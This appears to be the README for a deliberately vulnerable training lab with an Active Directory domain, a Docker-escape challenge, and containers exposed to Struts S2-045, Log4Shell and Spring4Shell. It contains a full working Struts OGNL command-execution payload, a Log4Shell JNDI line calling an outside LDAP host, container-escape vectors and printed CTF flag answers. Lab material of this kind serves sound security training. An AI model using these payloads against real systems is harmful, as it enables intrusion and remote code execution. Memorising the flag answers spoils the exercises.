# Advanced Targets

Advanced penetration testing scenarios including Active Directory, container escapes, and real-world CVE exploits.

## 🎯 Services

### Active Directory Environment

#### Domain Controller
- **Container:** lab_ad_dc
- **Domain:** CORP.LOCAL
- **NetBIOS:** CORP
- **Admin Password:** Passw0rd!
- **Ports:** 389 (LDAP), 636 (LDAPS), 88 (Kerberos), 464 (Kerberos Password), 3268 (GC)

#### Domain Client
- **Container:** lab_ad_client
- **Hostname:** client01.corp.local
- **Purpose:** Practice AD attacks from a domain-joined perspective

### Docker Escape Challenge

- **Container:** lab_docker_escape
- **Challenge:** Escape the container to access the host system
- **Hints:** Privileged mode enabled, host filesystem mounted, Docker socket exposed
- **Flag Location:** `/flag.txt` inside container

### Real CVE Targets

#### 1. Apache Struts RCE (S2-045)
- **Port:** 8090
- **CVE:** CVE-2017-5638
- **Description:** Jakarta Multipart Parser RCE
- **URL:** http://localhost:8090

#### 2. Log4Shell
- **Port:** 8091
- **CVE:** CVE-2021-44228
- **Description:** Log4j2 Remote Code Execution
- **URL:** http://localhost:8091

#### 3. Spring4Shell
- **Port:** 8092
- **CVE:** CVE-2022-22965
- **Description:** Spring Core RCE via Data Binding
- **URL:** http://localhost:8092

### CTF Flags Container

- **Container:** lab_flags
- **Purpose:** Stores flags for capture-the-flag style challenges
- **Location:** `./flags/` directory

## 🚀 Usage

```bash
# Start all advanced targets
docker-compose up -d

# Start specific target
docker-compose up -d ad_dc
docker-compose up -d docker_escape

# View logs
docker-compose logs -f ad_dc

# Stop all services
docker-compose down
```

## 🎓 Attack Scenarios

### Active Directory Attacks

**Setup:**
```bash
# Access the domain client
docker exec -it lab_ad_client bash

# Configure Kerberos
cat > /etc/krb5.conf <<EOF
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    CORP.LOCAL = {
        kdc = ad_dc
        admin_server = ad_dc
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
EOF
```

**Attack Types:**
- **Kerberoasting:** Extract service tickets and crack offline
- **AS-REP Roasting:** Target accounts with "Do not require Kerberos preauthentication"
- **Pass-the-Hash:** Use NTLM hashes for authentication
- **Golden Ticket:** Create forged Kerberos tickets
- **LDAP Enumeration:** Query AD for users, groups, computers

**Tools:**
- Impacket suite
- BloodHound
- Rubeus
- Mimikatz
- CrackMapExec

### Docker Escape Techniques

**Challenge Goal:** Escape the container and read files on the host system.

**Access Container:**
```bash
docker exec -it lab_docker_escape bash
```

**Escape Vectors:**
1. **Privileged Mode Exploitation**
   - Container runs with `--privileged` flag
   - Can access host devices

2. **Host Filesystem Mount**
   - Host root filesystem mounted at `/host`
   - Direct access to host files

3. **Docker Socket Exposure**
   - Docker socket mounted into container
   - Can spawn new privileged containers

**Success Criteria:**
- Read `/etc/shadow` from the host
- Execute commands on the host
- Access other container filesystems

### CVE Exploitation

#### Struts S2-045 (CVE-2017-5638)
```bash
# Using exploit
curl -i -s -k -X POST \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  http://localhost:8090/
```

#### Log4Shell (CVE-2021-44228)
```bash
# JNDI Injection
curl -H "X-Api-Version: \${jndi:ldap://your-server:1389/Exploit}" http://localhost:8091/
```

#### Spring4Shell (CVE-2022-22965)
```bash
# Class loader manipulation exploit
# Requires crafted POST request to vulnerable endpoint
```

## 🏁 CTF Flags

Flags are stored in the `flags/` directory:

- **flag1_web.txt** → WEB{juicy_entry_point}
- **flag2_creds.txt** → CREDS{password_reuse_wins}
- **flag3_privesc.txt** → ROOT{docker_is_not_a_vm}
- **flag4_ad.txt** → AD{kerberoast_the_world}

**Capture methodology:**
1. Exploit web vulnerabilities → flag1
2. Extract credentials from services → flag2
3. Escalate privileges to root → flag3
4. Compromise Active Directory → flag4

## 💡 Learning Path

### Beginner
1. Start with Struts RCE (well-documented exploit)
2. Try Docker escape with obvious misconfigurations
3. Basic LDAP enumeration on AD

### Intermediate
1. Log4Shell exploitation with JNDI callback
2. Kerberoasting on Active Directory
3. Container escape via Docker socket

### Advanced
1. Spring4Shell exploitation
2. Golden Ticket attacks in AD
3. Full compromise chain: Web → Container → Host → AD

## ⚠️ Security Warnings

- **AD Environment:** Never use these credentials in production
- **Docker Escape:** Extremely dangerous - use in isolated VM only
- **CVE Targets:** Known exploits - keep completely isolated
- **Privileged Containers:** Can compromise host system
- **Flags Container:** Read-only mount, but practice safe access

## 📚 Resources

### Active Directory
- [PayloadsAllTheThings - AD Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [HackTricks - AD Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Impacket Tools](https://github.com/SecureAuthCorp/impacket)

### Container Security
- [HackTricks - Docker Security](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [Container Escape Techniques](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

### CVE Resources
- [Vulhub](https://github.com/vulhub/vulhub)
- [CVE Details](https://www.cvedetails.com/)
- [Exploit-DB](https://www.exploit-db.com/)
